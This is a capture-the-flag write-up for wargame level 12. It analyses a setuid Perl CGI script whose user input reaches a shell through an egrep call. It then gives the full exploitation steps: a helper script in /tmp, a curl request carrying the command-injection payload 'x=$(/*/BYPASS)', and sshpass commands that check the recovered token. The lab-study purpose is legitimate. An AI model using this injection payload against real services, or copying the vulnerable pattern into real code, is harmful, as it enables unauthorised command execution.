# level12

## Steps

1. __Action__ (Guest): list the files present at the root
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals one intersting file
	`level12.pl`
	```
	.bash_logout  .bashrc  .profile  level12.pl
	```

3. __Action__ (Guest): check the file access control list of the `level12.pl` file
	```sh
	getfacl level12.pl
	```

4. __Observation__ (Guest): the previous command reveals that the `level12.pl` file:
	- is readable by the `level12` user
	- is executable by the `level12` user
	- is owned by the `flag12` user
	- has the `setuid` bit and the `setgid` bit enabled
	```
	# file: level12.pl
	# owner: flag12
	# group: level12
	# flags: ss-
	user::rwx
	group::r-x
	group:flag12:rwx      #effective:r-x
	mask::r-x
	other::r-x
	```

5. __Action__ (Guest): check the contents of the `level12.pl` file
	```sh
	cat level12.pl
	```

6. __Observation__ (Guest): the previous command reveals that the `level12.pl` file is a Perl script
	that:
	1. listens on the port `4646`

	2. retreives two HTTP parameters named `x` and `y`

	3. keeps only the first word of the `x` parameter and transforms it to uppercase,
		let's call it `xx`

	4. searches for any line that starts with the `xx` pattern in the `/tmp/xd` file
		using a the `egrep` shell command

	5. for each line found, it:
		1. splits the line into two parts using the `:` character, storing the first part
			in the variable `f` and the second part in the variable `s`
		2. checks if `s` matches the `y` parameter, and if it does, it prints `..` and exits

	6. if no match is found, it prints `.` and exits
	```perl
	#!/usr/bin/env perl
	# localhost:4646
	use CGI qw{param};
	print "Content-type: text/html\n\n";

	sub t {
		$nn = $_[1];
		$xx = $_[0];
		$xx =~ tr/a-z/A-Z/;
		$xx =~ s/\s.*//;
		@output = `egrep "^$xx" /tmp/xd 2>&1`;
		foreach $line (@output) {
			($f, $s) = split(/:/, $line);
			if($s =~ $nn) {
				return 1;
			}
		}
		return 0;
	}

	sub n {
		if($_[0] == 1) {
			print("..");
		} else {
			print(".");
		}
	}

	n(t(param("x"), param("y")));
	```
	This script has a major security vulnerability, because it expands the `xx` variable directly
	into the `egrep` command, variable that is just a transformation of the `x` parameter, which
	is passed by the user. And because it expands it in a dual-quoted string, it allows the user
	to make shell commands injection.

7. __Action__ (Guest): create a shell script that will be named `BYPASS` in order to bypass
	the string transformations mentionned above and that will allow us to retrieve the flag
	```sh
	echo '#!/bin/sh -eu' >/tmp/BYPASS
	echo >>/tmp/BYPASS
	echo "getflag | egrep -o '[^ ]+$' >/tmp/token" >>/tmp/BYPASS
	```

8. __Action__ (Guest): make the `BYPASS` file executable
	```sh
	chmod +x /tmp/BYPASS
	```

9. __Action__ (Guest): send an HTTP request to the `level12.pl` script
	with a malicious `x` parameter that will trigger the execution of the `BYPASS` script
	```sh
	curl localhost:4646 -d 'x=$(/*/BYPASS)'
	```

10. __Action__ (Guest): check if the `token` file has been correctly created
	and contains the wanted token
	```sh
	cat /tmp/token
	```

11. __Observation__ (Guest): the previous command reveals that the file has been created,
	and seems to contains the wanted token
	```
	g1qKMiRpXf53AWhDaU7FEkczr
	```

12. __Action__ (Host): check if the token is correct by trying to connect as the `level13` user
	```sh
	sshpass -p g1qKMiRpXf53AWhDaU7FEkczr 2>/dev/null \
		ssh -p 4242 level13@192.168.122.214 exit \
	&& echo 'Great! The token is correct!' \
	|| echo 'Nop, the token is incorrect!'
	```

13. __Observation__ (Host): the previous command reveals that the token is correct,
	by printing the following message on stdout:  
	`Great! The token is correct!`

14. __Action__ (Host): copy the `token` file from the virtual machine
	```sh
	sshpass -f level11/flag 2>/dev/null \
		scp -P 4242 level12@192.168.122.214:/tmp/token level12/flag
	```

15. __Action__ (Guest): remove the `token` and `BYPASS` files
	```sh
	rm -f /tmp/{'token','BYPASS'}
	```
